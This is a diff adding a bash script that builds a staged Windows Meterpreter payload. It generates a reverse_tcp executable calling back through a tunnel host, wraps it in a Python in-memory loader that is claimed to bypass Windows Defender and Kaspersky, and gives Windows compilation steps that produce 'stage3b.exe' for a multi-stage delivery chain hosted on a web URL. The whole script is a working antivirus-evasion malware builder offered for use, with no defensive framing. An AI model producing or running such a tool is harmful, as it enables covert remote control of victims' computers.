@@ -1,0 +1,169 @@
+#!/bin/bash
+# pgen_auto2.sh - In-Memory Meterpreter Payload Builder (based on hackmag.com article)
+# Usage: ./pgen_auto2.sh -t tunnel.trycloudflare.com -u https://your-site.vercel.app [-p PORT] [-v]
+# This script generates a 32-bit Meterpreter payload wrapped in a Python in-memory loader
+# that bypasses Windows Defender and Kaspersky (as of 2025-11-25).
+# The final EXE must be compiled on a Windows machine (cannot be done under WINE).
+
+set -e
+
+# Colors
+RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'
+
+# Defaults
+TUNNEL_HOST=""
+WEB_URL=""
+BASE_PATH="/generated"
+PAYLOAD_PORT="443"
+OUTPUT_DIR="./generated"
+VISIBLE_MODE=0
+GIT_REPO="https://github.com/n0a/meterpreter-av-bypass"
+
+show_usage() {
+    echo -e "${YELLOW}Usage: $0 -t <tunnel> -u <url> [-p PORT] [-v]${NC}"
+    echo "  -t  tunnel hostname (e.g., something.trycloudflare.com or bore.pub)"
+    echo "  -u  your web server URL (e.g., https://domenca.vercel.app)"
+    echo "  -p  port for callback (default: 443)"
+    echo "  -v  visible/debug mode"
+    exit 1
+}
+
+# Parse arguments
+while [[ $# -gt 0 ]]; do
+    case $1 in
+        -t|--tunnel) TUNNEL_HOST="$2"; shift 2 ;;
+        -u|--url) WEB_URL="$2"; shift 2 ;;
+        -p|--port) PAYLOAD_PORT="$2"; shift 2 ;;
+        -v|--visible) VISIBLE_MODE=1; shift ;;
+        -h|--help) show_usage ;;
+        *) echo -e "${RED}Unknown option $1${NC}"; show_usage ;;
+    esac
+done
+
+[ -z "$TUNNEL_HOST" ] || [ -z "$WEB_URL" ] && show_usage
+
+WEB_URL="${WEB_URL%/}"
+FULL_BASE_URL="${WEB_URL}${BASE_PATH}"
+
+echo -e "${GREEN}[✓] Tunnel: $TUNNEL_HOST${NC}"
+echo -e "${GREEN}[✓] Web URL: $FULL_BASE_URL${NC}"
+echo -e "${GREEN}[✓] Callback port: $PAYLOAD_PORT${NC}"
+echo -e "${GREEN}[✓] Mode: $([ $VISIBLE_MODE -eq 1 ] && echo VISIBLE || echo STEALTH)${NC}"
+
+mkdir -p "$OUTPUT_DIR"/{payloads,tools,output}
+cd "$OUTPUT_DIR"
+
+# ========== STEP 1: Clone or update the bypass repository ==========
+echo -e "${YELLOW}[1/5] Cloning/updating meterpreter-av-bypass repository...${NC}"
+if [ ! -d "../meterpreter-av-bypass" ]; then
+    git clone "$GIT_REPO" ../meterpreter-av-bypass
+else
+    cd ../meterpreter-av-bypass && git pull && cd - >/dev/null
+fi
+
+# ========== STEP 2: Generate 32-bit Meterpreter payload ==========
+echo -e "${YELLOW}[2/5] Generating 32-bit Meterpreter payload (x86)...${NC}"
+msfvenom -p windows/meterpreter/reverse_tcp LHOST="$TUNNEL_HOST" LPORT="$PAYLOAD_PORT" -f exe -o output/payload.exe
+if [ ! -f output/payload.exe ]; then
+    echo -e "${RED}✗ msfvenom failed${NC}"
+    exit 1
+fi
+echo -e "${GREEN}✓ Payload generated: output/payload.exe${NC}"
+
+# ========== STEP 3: Prepare Python loader files ==========
+echo -e "${YELLOW}[3/5] Generating Python loader files (using gen.sh)...${NC}"
+cd ../meterpreter-av-bypass
+./gen.sh "$OUTPUT_DIR/output/payload.exe"
+if [ $? -ne 0 ]; then
+    echo -e "${RED}✗ gen.sh failed. Ensure the repo is correct and payload.exe exists.${NC}"
+    exit 1
+fi
+cd - >/dev/null
+
+# The gen.sh creates a folder named after the payload (e.g., "payload")
+LOADER_DIR="../meterpreter-av-bypass/payload"
+if [ ! -d "$LOADER_DIR" ]; then
+    echo -e "${RED}✗ Loader directory not found. Check gen.sh output.${NC}"
+    exit 1
+fi
+
+# Copy the generated files to our payloads folder for easy access
+cp "$LOADER_DIR"/* payloads/ 2>/dev/null || true
+echo -e "${GREEN}✓ Loader files prepared in payloads/ and $LOADER_DIR${NC}"
+
+# ========== STEP 4: Provide Windows compilation instructions ==========
+echo -e "${YELLOW}[4/5] Windows compilation instructions:${NC}"
+cat << 'EOF'
+------------------------------------------------------------
+The final EXE must be compiled on a Windows machine (cannot be done under WINE).
+Follow these steps:
+
+1. Copy the entire folder:
+     $(realpath "$LOADER_DIR")
+   to your Windows machine (e.g., C:\build\).
+
+2. On Windows, install:
+   - Python 2.7 (32-bit)
+   - py2exe 0.6.9 for Python 2.7 (32-bit)
+   - vcredist_x86.exe (if needed)
+
+3. Open a command prompt as Administrator, navigate to the folder,
+   and run:
+     make.bat
+
+4. After compilation, the final executable will be in the 'dist' folder.
+   It will be named something like 'payload.exe' (or the base name of your payload).
+
+5. Rename this final EXE to 'stage3b.exe' and place it in:
+     $(realpath "$OUTPUT_DIR/payloads/")
+   (overwrite the existing placeholder if any).
+
+6. Ensure all other files (stage1.bat, stage2.exe, etc.) are in place.
+   If you haven't generated them yet, you can run your original pgen_auto.sh
+   with the same parameters (it will reuse the new stage3b.exe).
+------------------------------------------------------------
+EOF
+
+# ========== STEP 5: Create a placeholder for stage3b.exe and reminder script ==========
+echo -e "${YELLOW}[5/5] Creating placeholder and reminder script...${NC}"
+
+# Create a placeholder text file to remind user
+cat > payloads/README_PYLOADER.txt <<EOF
+This folder contains the Python loader source generated by pgen_auto2.sh.
+
+To build the final stage3b.exe:
+1. Copy this entire folder to a Windows machine with Python 2.7 and py2exe installed.
+2. Run make.bat in that folder.
+3. Copy the resulting EXE from the 'dist' folder back here, renaming it to stage3b.exe.
+4. Then you can run your original pgen_auto.sh (or use existing stage2.exe, stage1.bat)
+   with the same tunnel and URL.
+
+Current loader source files:
+$(ls -la payloads/ | grep -v stage1.bat | grep -v stage2.exe)
+EOF
+
+# Create a simple reminder script
+cat > build_on_windows.ps1 <<'EOF'
+# build_on_windows.ps1
+# Run this on Windows with Python 2.7 and py2exe installed
+Write-Host "Building Python loader..." -ForegroundColor Cyan
+Set-Location "$PSScriptRoot\payloads"
+& .\make.bat
+if ($LASTEXITCODE -eq 0) {
+    Write-Host "Build successful!" -ForegroundColor Green
+    Write-Host "The final EXE is in the 'dist' folder. Rename it to stage3b.exe and place it back in payloads/." -ForegroundColor Yellow
+} else {
+    Write-Host "Build failed. Ensure Python 2.7 and py2exe are installed correctly." -ForegroundColor Red
+}
+EOF
+
+chmod +x build_on_windows.ps1
+
+echo -e "${GREEN}✅ Preparation complete!${NC}"
+echo -e "${YELLOW}Next steps:${NC}"
+echo "1. Follow the instructions above to compile the final EXE on Windows."
+echo "2. Once stage3b.exe is in place, you can use your existing pgen_auto.sh"
+echo "   (or the generated files) to upload and test the full chain."
+echo "3. Remember to start your bore tunnel or other forwarding service."
+echo ""
+echo -e "${GREEN}Happy hacking! 🚀${NC}"
